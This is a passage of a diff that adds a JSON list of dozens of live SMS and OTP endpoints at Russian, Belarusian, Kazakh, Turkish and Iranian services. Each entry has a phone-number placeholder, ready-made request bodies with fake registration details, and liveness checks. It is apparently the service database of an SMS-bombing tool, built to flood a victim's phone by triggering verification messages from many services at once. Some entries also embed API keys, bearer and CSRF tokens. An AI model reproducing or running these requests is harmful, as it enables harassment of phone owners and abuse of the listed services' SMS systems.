+        "url": "https://app.cloudloyalty.ru/demo/send-code",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "country": 2,
+          "phone": "7{phone}",
+          "roistatVisit": 47637
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"success\":false,\"error\":\"\\u041d\\u0435 \\u0443\\u0434\\u0430\\u043b\\u043e\\u0441\\u044c \\u043e\\u0431\\u0440\\u0430\\u0431\\u043e\\u0442\\u0430\\u0442\\u044c \\u0437\\u0430\\u043f\\u0440\\u043e\\u0441, \\u043d\\u0430\\u043f\\"
+    }
+  },
+  {
+    "id": "bsl-cian",
+    "name": "Cian",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.cian.ru/sms/v1/send-validation-code/",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone": "+7{phone}",
+          "type": "authenticateCode"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"message\":\"Превышено количество попыток отправки кода. Попробуйте позже или обратитесь в службу поддержки.\",\"errors\":[{\"message\":\"Превышено количество попыток отправки кода. Попробуйте позже или обра"
+    }
+  },
+  {
+    "id": "bsl-sbis",
+    "name": "Sbis",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://online.sbis.ru/reg/service/",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "firstName": "Олег",
+          "middleName": "Олег",
+          "lastName": "Олег",
+          "sex": "1",
+          "birthDate": "7.9.1997",
+          "mobilePhone": "+7{phone}",
+          "russianFederationResident": "true",
+          "isDSA": "false",
+          "personalDataProcessingAgreement": "true",
+          "bKIRequestAgreement": "null",
+          "promotionAgreement": "true"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 500,
+      "why": "http:500+structured",
+      "response": "{\"jsonrpc\":\"2.0\",\"error\":{\"code\":-32700,\"message\":\"\",\"details\":\"method field not found\",\"type\":\"error\",\"data\":{\"classid\":\"{f4101a18-9ea7-447d-9f98-9a951643f9f0}\",\"error_code\":-1,\"addinfo\":null}},\"id\":"
+    }
+  },
+  {
+    "id": "bsl-invitro_lk",
+    "name": "InvitroLK",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://lk.invitro.ru/lk2/lka/patient/refreshCode",
+        "data": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{}"
+    }
+  },
+  {
+    "id": "bsl-ivi",
+    "name": "Ivi",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.ivi.ru/mobileapi/user/register/phone/v6",
+        "data": {
+          "phone": "+7{phone}"
+        },
+        "headers": {
+          "Referer": "https://www.ivi.ru/profile",
+          "Origin": "https://www.ivi.ru/",
+          "Content-Type": "application/x-www-form-urlencoded"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\n  \"error\": {\n    \"message\": \"app_version parameter is required\",\n    \"code\": 400,\n    \"user_message\": \"Что-то пошло не так. Пожалуйста, попробуй позже.\"\n  }\n}"
+    }
+  },
+  {
+    "id": "bsl-ozon",
+    "name": "Ozon",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.ozon.ru/api/composer-api.bx/_action/fastEntry",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone": "+7{phone}",
+          "otpId": 0
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 403,
+      "why": "http:403+structured",
+      "response": "\n\n{\"incidentId\": \"fab_20261012161942_01M4REKACF8T6YP6W7P38ZB060\", \"supportURL\": \"https://www.ozon.ru/complaint/support/?incident_id=fab_20261012161942_01M4REKACF8T6YP6W7P38ZB060&token=1.R6kgPGbNw9_79y"
+    }
+  },
+  {
+    "id": "bsl-delitime",
+    "name": "Delitime",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.delitime.ru/api/v2/signup",
+        "data": {
+          "SignupForm[username]": "+7{phone}",
+          "SignupForm[device_type]": "3"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"errorCodes\":[403],\"errorMessages\":[\"No token provided.\"],\"status\":false}"
+    }
+  },
+  {
+    "id": "bsl-playfamily",
+    "name": "Playfamily",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://ctx.playfamily.ru/screenapi/v3/sendsmscode/web/1",
+        "data": {
+          "phone": "{phone}",
+          "password": "{password}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\r\n  \"antibot\": true,\r\n  \"datetime\": \"2026-10-12 16:19:43 +0000\",\r\n  \"ip\": \"91.238.88.42\",\r\n  \"id\": \"hJblceRkrW21\"\r\n}"
+    }
+  },
+  {
+    "id": "bsl-netprint",
+    "name": "Netprint",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.netprint.ru/order/social-auth",
+        "headers": {
+          "X-Requested-With": "XMLHttpRequest",
+          "Referer": "https://www.netprint.ru/order/profile",
+          "Origin": "https://www.netprint.ru",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data": {
+          "operation": "stdreg",
+          "email_or_phone": "{phone_formatted}",
+          "i_agree_with_terms": "1"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"code\":400,\"msg\":\"Unknown operation\",\"performance\":[]}"
+    }
+  },
+  {
+    "id": "bsl-qlean_api",
+    "name": "Qlean",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      7
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://qlean.ru/clients-api/v2/sms_codes/auth/request_code",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": ""
+    }
+  },
+  {
+    "id": "bsl-markformelle",
+    "name": "Markformelle",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      375
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://markformelle.by/local/templates/markformelle/components/bitrix/system.auth.form/mf/ajax.php",
+        "data": {
+          "phone": "+7{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "ok_empty",
+      "status": 200,
+      "why": "http:200",
+      "response": ""
+    }
+  },
+  {
+    "id": "bsl-carte_by_by",
+    "name": "Carte By By",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      375
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://carte.by/auth/",
+        "data": {
+          "ajax": "register",
+          "login": "Olegkiller229",
+          "pass": "CbivnE5316",
+          "phone": "+7{phone}",
+          "code": "",
+          "company": "0",
+          "resend": "1",
+          "checksum": "675"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"error\":1,\"message\":\"\\u041f\\u043e\\u0436\\u0430\\u043b\\u0443\\u0439\\u0441\\u0442\\u0430, \\u043f\\u0440\\u0438\\u043c\\u0438\\u0442\\u0435 \\u0441\\u043e\\u0433\\u043b\\u0430\\u0448\\u0435\\u043d\\u0438\\u0435 \\u043d\\u0430"
+    }
+  },
+  {
+    "id": "bsl-marko_by_by",
+    "name": "Marko By By",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      375
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.marko.by/ajax/registerSendConfirmCode.php",
+        "headers": {
+          "x-requested-with": "XMLHttpRequest",
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        "data": {
+          "form_data": "first_name=&last_name=&email=&phone=+7{phone}&sms_code=&password=&password_confirm="
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":\"error\",\"text\":\"\\u041e\\u0448\\u0438\\u0431\\u043a\\u0430 \\u0437\\u0430\\u043f\\u0440\\u043e\\u0441\\u0430\"}"
+    }
+  },
+  {
+    "id": "bsl-naimi_sms",
+    "name": "NaimiSMS",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      77
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://naimi.kz/api/app/pub/login/code",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone": "+7{phone}",
+          "type": "sms"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":false,\"message\":\"Подтвердите, что вы не робот.\"}"
+    }
+  },
+  {
+    "id": "bsl-soso_kz",
+    "name": "SosoKZ",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      77
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.soso.kz/api/landing-form",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "amount": 100000,
+          "phone": "+7{phone}",
+          "locale": "ru"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 422,
+      "why": "http:422+structured",
+      "response": "{\"errors\":[{\"error_key\":\"email_invalid\",\"error_messages\":[\"\\u041f\\u043e\\u043b\\u0435 e-mail \\u043e\\u0431\\u044f\\u0437\\u0430\\u0442\\u0435\\u043b\\u044c\\u043d\\u043e \\u0434\\u043b\\u044f \\u0437\\u0430\\u043f\\u043"
+    }
+  },
+  {
+    "id": "bsl-aloalo_kz",
+    "name": "AloAloKZ",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      77
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://alo-alo.kz/api/shop-api/auth/register",
+        "data": {
+          "phone": "+7{phone}",
+          "sms": ""
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"message\":\"Укажите мобильный номер Казахстана\",\"error\":\"Bad Request\",\"statusCode\":400,\"messages\":[\"Укажите мобильный номер Казахстана\"]}"
+    }
+  },
+  {
+    "id": "bsl-korzinavdom_kz",
+    "name": "KorzinaVDomKZ",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      77
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.korzinavdom.kz/client/auth/smsRequest",
+        "data": {
+          "phone": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"error\":{\"type\":\"HttpMediaTypeNotSupportedException\",\"payload\":\"Content type 'application/x-www-form-urlencoded;charset=UTF-8' not supported\"}}"
+    }
+  },
+  {
+    "id": "bsl-kahvedunyasi",
+    "name": "KahveDunyasi",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Language-Id": "tr-TR",
+          "X-Client-Platform": "web"
+        },
+        "json": {
+          "countryCode": "90",
+          "phoneNumber": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"payload\":{\"expiresIn\":60,\"isNewUser\":false,\"userId\":\"08df27af-c7e9-74ce-0a5c-02f301000000\"},\"processStatus\":\"Success\",\"friendlyMessage\":null,\"serverTime\":1791821967}"
+    }
+  },
+  {
+    "id": "bsl-englishhome",
+    "name": "EnglishHome",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.englishhome.com/api/member/sendOtp",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "Phone": "90{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"isError\":true,\"message\":\"Hatalı güvenlik kodu, lütfen tekrar deneyiniz.\",\"encryptedOtp\":null,\"otpSendDate\":null,\"captcha\":true}"
+    }
+  },
+  {
+    "id": "bsl-suiste",
+    "name": "Suiste",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://suiste.com/api/auth/code",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
+          "X-Mobillium-Device-Brand": "Apple",
+          "X-Mobillium-Os-Type": "iOS",
+          "X-Mobillium-Device-Model": "iPhone",
+          "Accept-Language": "en"
+        },
+        "data": {
+          "action": "register",
+          "device_id": "2390ED28-075E-465A-96DA-DFE8F84EB330",
+          "full_name": "Memati Bas",
+          "gsm": "{phone}",
+          "is_advertisement": "1",
+          "is_contract": "1",
+          "password": "31MeMaTi31"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"code\":\"common.success\",\"message\":\"Success\",\"data\":null}"
+    }
+  },
+  {
+    "id": "bsl-evidea",
+    "name": "Evidea",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.evidea.com/users/register/",
+        "headers": {
+          "Content-Type": "multipart/form-data",
+          "X-Project-Name": "undefined",
+          "X-App-Type": "akinon-mobile",
+          "X-App-Device": "ios",
+          "X-Csrftoken": "7NdJbWSYnOdm70YVLIyzmylZwWbqLFbtsrcCQdLAEbnx7a5Tq4njjS3gEElZxYps"
+        },
+        "data": {
+          "first_name": "Memati",
+          "last_name": "Bas",
+          "email": "test@gmail.com",
+          "email_allowed": "false",
+          "sms_allowed": "true",
+          "password": "31ABC..abc31",
+          "phone": "0{phone}",
+          "confirm": "true"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"detail\":\"Multipart form parse error - Invalid boundary in multipart: None\"}"
+    }
+  },
+  {
+    "id": "bsl-tavukdunyasi",
+    "name": "TavukDunyasi",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://onlinesiparis-api.tavukdunyasi.com/api/InternalAuth/InternalRegister",
+        "headers": {
+          "Content-Type": "application/json",
+          "Origin": "https://onlinesiparis.tavukdunyasi.com",
+          "x-culture": "tr"
+        },
+        "json": {
+          "email": "test@gmail.com",
+          "password": "Test1234!",
+          "rePassword": "Test1234!",
+          "name": "Test",
+          "surname": "User",
+          "countryCode": "90",
+          "phoneNumber": "{phone}",
+          "birthDate": "1990-01-01",
+          "gender": 1,
+          "isKvkkApproved": true,
+          "isCampaignApproved": true,
+          "isMembershipContractApproved": true,
+          "isEInvoiceApproved": true,
+          "isETicketApproved": true,
+          "isUserAgreementApproved": true,
+          "isCommercialElectronicMessageApproved": true
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"result\":null,\"ok\":false,\"metadata\":{\"message\":\"Girilen bilgiler ge\\u00E7erli de\\u011Fil, l\\u00FCtfen kontrol ediniz.\\r\\n - \\u0027Telefon\\u0027 bo\\u015F olmamal\\u0131.\\r\\n - \\u0027Soyad\\u0027 bo\\u015"
+    }
+  },
+  {
+    "id": "bsl-koton",
+    "name": "Koton",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.koton.com/users/register/",
+        "headers": {
+          "Content-Type": "multipart/form-data",
+          "X-Project-Name": "rn-env",
+          "X-App-Type": "akinon-mobile",
+          "X-App-Device": "ios",
+          "X-Csrftoken": "5DDwCmziQhjSP9iGhYE956HHw7wGbEhk5kef26XMFwhELJAWeaPK3A3vufxzuWcz"
+        },
+        "data": {
+          "first_name": "Memati",
+          "last_name": "Bas",
+          "email": "test@gmail.com",
+          "password": "31ABC..abc31",
+          "phone": "0{phone}",
+          "confirm": "true",
+          "sms_allowed": "true",
+          "email_allowed": "true",
+          "date_of_birth": "1993-07-02",
+          "call_allowed": "true",
+          "gender": ""
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"first_name\":[\"Bu alan zorunludur.\"],\"last_name\":[\"Bu alan zorunludur.\"],\"email\":[\"Bu alan zorunludur.\"],\"phone\":[\"Bu alan zorunludur.\"]}"
+    }
+  },
+  {
+    "id": "bsl-hayatsu",
+    "name": "Hayatsu",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.hayatsu.com.tr/api/SignUp/SendOtp",
+        "headers": {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Authorization": "Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"
+        },
+        "data": {
+          "mobilePhoneNumber": "{phone}",
+          "actionType": "register"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"is_success\":false,\"title\":\"\",\"error_code\":\"400\",\"message\":\"Geçersiz istek imzası.\",\"merchantPaymentId\":\"\",\"total_rows\":0,\"page_number\":0,\"rows_count\":1,\"total_page\":0}"
+    }
+  },
+  {
+    "id": "bsl-metro_tr",
+    "name": "MetroTR",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://mobile.metro-tr.com/api/mobileAuth/validateSmsSend",
+        "headers": {
+          "Content-Type": "application/json; charset=utf-8",
+          "Applicationversion": "2.4.1",
+          "Applicationplatform": "2",
+          "Accept-Language": "en-BA;q=1.0, tr-BA;q=0.9, bs-BA;q=0.8"
+        },
+        "json": {
+          "methodType": "2",
+          "mobilePhoneNumber": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":\"success\",\"statusCode\":200,\"results\":{\"activationSmsID\":\"576e67b8-84c8-40e3-8699-960aa1f2b90e\",\"cardNumberList\":null},\"message\":\"Aktivasyon kodu başarı ile gönderildi.\",\"analytics\":null}"
+    }
+  },
+  {
+    "id": "bsl-filemarket",
+    "name": "FileMarket",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.filemarket.com.tr/v1/otp/send",
+        "headers": {
+          "Content-Type": "application/json",
+          "X-Os": "IOS",
+          "X-Version": "1.7"
+        },
+        "json": {
+          "mobilePhoneNumber": "90{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+request-rejected",
+      "response": "{\"errorMessage\":{\"key\":\"validation\",\"content\":\"Lütfen bilgilerinizi kontrol edin\"},\"responseType\":\"ERROR\"}"
+    }
+  },
+  {
+    "id": "bsl-porty",
+    "name": "Porty",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://panel.porty.tech/api.php",
+        "headers": {
+          "Content-Type": "application/json",
+          "Token": "q2zS6kX7WYFRwVYArDdM66x72dR6hnZASZ"
+        },
+        "json": {
+          "job": "start_login",
+          "phone": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":\"success\",\"job\":\"start_login\",\"start_time\":\"19:19:21\",\"count_status\":\"no count found\",\"user\":{\"id\":\"12231353\",\"balance_fee\":\"0.00\",\"login_type\":\"normal_user\",\"hash\":\"\",\"theme\":\"light\",\"langu"
+    }
+  },
+  {
+    "id": "bsl-yapp_tr",
+    "name": "YappTR",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://yapp.com.tr/api/mobile/v1/register",
+        "headers": {
+          "Content-Type": "application/json",
+          "Accept-Language": "en-BA;q=1, tr-BA;q=0.9, bs-BA;q=0.8",
+          "Authorization": "Bearer"
+        },
+        "json": {
+          "app_version": "1.1.5",
+          "code": "tr",
+          "device_model": "iPhone8,5",
+          "device_name": "Memati",
+          "device_type": "I",
+          "device_version": "15.8.3",
+          "email": "test@gmail.com",
+          "firstname": "Memati",
+          "is_allow_to_communication": "1",
+          "language_id": "2",
+          "lastname": "Bas",
+          "phone_number": "{phone}",
+          "sms_code": ""
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"message\":\"Telefon numaran\\u0131za SMS g\\u00f6nderildi\"}"
+    }
+  },
+  {
+    "id": "bsl-bodrum",
+    "name": "Bodrum",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://gandalf.orwi.app/api/user/requestOtp",
+        "headers": {
+          "Content-Type": "application/json",
+          "Apikey": "Ym9kdW0tYmVsLTMyNDgyxLFmajMyNDk4dDNnNGg5xLE4NDNoZ3bEsXV1OiE",
+          "Region": "EN"
+        },
+        "json": {
+          "gsm": "+90{phone}",
+          "source": "orwi"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"error\":{\"code\":\"captcha_invalid\",\"desc\":\"captcha_invalid\"}}"
+    }
+  },
+  {
+    "id": "bsl-ido_tr",
+    "name": "IdoTR",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.ido.com.tr/idows/v2/register",
+        "headers": {
+          "Content-Type": "application/json",
+          "Accept-Language": "tr"
+        },
+        "json": {
+          "birthDate": true,
+          "captcha": "",
+          "checkPwd": "313131",
+          "code": "",
+          "day": 24,
+          "email": "test@gmail.com",
+          "emailNewsletter": false,
+          "firstName": "MEMATI",
+          "gender": "MALE",
+          "lastName": "BAS",
+          "mobileNumber": "0{phone}",
+          "month": 9,
+          "pwd": "313131",
+          "smsNewsletter": true,
+          "tckn": "{tc}",
+          "termsOfUse": true,
+          "year": 1977
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\n   \"errors\" : [ {\n      \"message\" : \"CAPTCHA doğrulanamadı. Lütfen tekrar deneyin.\",\n      \"reason\" : \"missing\",\n      \"subject\" : \"captchaToken\",\n      \"subjectType\" : \"parameter\",\n      \"type\" : \""
+    }
+  },
+  {
+    "id": "bsl-wmf_tr",
+    "name": "WMFTR",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      90
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.wmf.com.tr/users/register/",
+        "data": {
+          "confirm": "true",
+          "date_of_birth": "1956-03-01",
+          "email": "test@gmail.com",
+          "email_allowed": "true",
+          "first_name": "Memati",
+          "gender": "male",
+          "last_name": "Bas",
+          "password": "31ABC..abc31",
+          "phone": "0{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+structured",
+      "response": "{\"phone\":[\"Telefon numaranız başında 0 olacak şekilde 11 haneden oluşmalıdır. Ör: 05999999999\"]}"
+    }
+  },
+  {
+    "id": "bsl-banimode",
+    "name": "Banimode",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://mobapi.banimode.com/api/v2/auth/request",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phone": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 422,
+      "why": "http:422+structured",
+      "response": "{\"status\":\"error\",\"message\":\"\\u0634\\u0645\\u0627\\u0631\\u0647 \\u062a\\u0644\\u0641\\u0646 \\u0646\\u0628\\u0627\\u06cc\\u062f \\u06a9\\u0645\\u062a\\u0631 \\u0627\\u0632 11 \\u06a9\\u0627\\u0631\\u0627\\u06a9\\u062a\\u0631 "
+    }
+  },
+  {
+    "id": "bsl-digikala_v1",
+    "name": "DigikalaV1",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.digikala.com/v1/user/authenticate/",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "username": "{phone}",
+          "otp_call": false
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":200,\"data\":{\"phone\":\"989991234567\",\"has_account\":false,\"login_method\":\"otp\",\"sms_ttl\":180,\"has_password\":false}}"
+    }
+  },
+  {
+    "id": "bsl-digikala_v2",
+    "name": "DigikalaV2",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://api.digikala.com/v1/user/forgot/check/",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "username": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"status\":200,\"data\":{\"is_phone\":true,\"username\":\"9991234567\",\"sms_ttl\":180}}"
+    }
+  },
+  {
+    "id": "bsl-alibaba",
+    "name": "Alibaba",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phoneNumber": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"result\":{\"tempToken\":\"7290B8D724710D5D6DC765A42B89D28337B5DB78D5151BD7D441A44EABF2CF6DF8CBFB41D19DE5E9A380D896C37CB9CD644CC816A7805789FCE0C132E7A8A882\",\"message\":\"پیامک حاوی کد یکبار مصرف برای شما ا"
+    }
+  },
+  {
+    "id": "bsl-sheypoor",
+    "name": "Sheypoor",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "username": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 400,
+      "why": "http:400+request-rejected",
+      "response": "{\"success\":false,\"message\":\"درخواست معتبر نیست\",\"errors\":[\"درخواست معتبر نیست\"],\"data\":{}}"
+    }
+  },
+  {
+    "id": "bsl-bikoplus",
+    "name": "Bikoplus",
+    "type": "SMS",
+    "min_version_code": 0,
+    "phone_codes": [
+      98
+    ],
+    "requests": [
+      {
+        "method": "POST",
+        "url": "https://bikoplus.com/account/check-phone-number",
+        "headers": {
+          "Content-Type": "application/json"
+        },
+        "json": {
+          "phoneNumber": "{phone}"
+        }
+      }
+    ],
+    "meta": {
+      "liveness": "alive",
+      "quality": "json_api",
+      "status": 200,
+      "why": "http:200",
+      "response": "{\"data\":{\"isExist\":true,\"authenticationMode\":1},\"isSuccess\":true,\"statusCode\":200,\"message\":\"کد تایید به شماره 9991234567 ارسال شد\",\"serverMessage\":\"\"}"
+    }
+  },
+  {
+    "id": "bsl-tap33",
+    "name": "Tap33",
+    "type": "SMS",
